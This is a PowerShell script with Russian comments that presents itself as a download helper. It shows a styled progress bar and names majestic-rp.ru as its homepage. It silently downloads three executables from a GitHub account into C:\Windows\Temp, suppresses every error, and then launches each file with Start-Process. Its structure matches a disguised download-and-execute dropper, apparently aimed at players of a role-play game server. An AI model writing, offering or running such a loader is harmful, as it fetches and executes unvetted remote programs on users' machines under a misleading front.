# === НАСТРОЙКА ЦВЕТА (меняй HEX здесь) ===
$hexColor = "#3A96DD"

[Console]::CursorVisible = $false  # <-- скрыть курсор

# Конвертация HEX в ANSI RGB фон
$r = [Convert]::ToInt32($hexColor.Substring(1,2), 16)
$g = [Convert]::ToInt32($hexColor.Substring(3,2), 16)
$b = [Convert]::ToInt32($hexColor.Substring(5,2), 16)
$bg = "$([char]27)[48;2;${r};${g};${b}m"
$reset = "$([char]27)[0m"
$white = "$([char]27)[97m"

$width = $Host.UI.RawUI.WindowSize.Width
if ($width -lt 1) { $width = 80 }

Write-Host "Need help? Check our homepage: " -NoNewline
Write-Host "majestic-rp.ru" -ForegroundColor Green

$pad = " " * $width

Write-Host "${bg}${white}${pad}${reset}"
Write-Host "${bg}${white}$("Downloading...".PadRight($width))${reset}"
$script:progressBarY = $Host.UI.RawUI.CursorPosition.Y
Write-Host "${bg}${white}${pad}${reset}"
Write-Host "${bg}${white}$("    Please wait".PadRight($width))${reset}"
Write-Host "${bg}${white}${pad}${reset}"

$script:bottomY = $Host.UI.RawUI.CursorPosition.Y

$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless2.exe'; Path = 'C:\Windows\Temp\timeless2.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

function Show-Progress {
    param ([int]$Percent)
    $barWidth = 40
    $filled = [int]($barWidth * $Percent / 100)
    $empty = $barWidth - $filled
    $bar = '#' * $filled + '-' * $empty
    $text = "  [$bar] $Percent%"
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:progressBarY
    Write-Host "${bg}${white}$($text.PadRight($width))${reset}" -NoNewline
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:bottomY
}

$totalFiles = $downloads.Count
$fileIndex = 0

Show-Progress 0

foreach ($item in $downloads) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $req = [System.Net.HttpWebRequest]::Create($item.URL)
        $req.AllowAutoRedirect = $true
        $req.UserAgent = "Mozilla/5.0"
        $response = $req.GetResponse()
        $totalBytes = $response.ContentLength
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($item.Path)
        $buffer = New-Object byte[] 8192
        $bytesRead = 0
        $totalRead = 0
        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $bytesRead)
            $totalRead += $bytesRead
            if ($totalBytes -gt 0) {
                $filePct = ($totalRead / $totalBytes)
                $totalPct = [int](($fileIndex + $filePct) / $totalFiles * 100)
                Show-Progress $totalPct
            }
        }
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        $fileIndex++
    }
    catch { }
}

Show-Progress 100

[Console]::CursorVisible = $true  # <-- вернуть курсор

foreach ($item in $downloads) {
    if (Test-Path $item.Path) {
        Start-Process $item.Path
    }
}
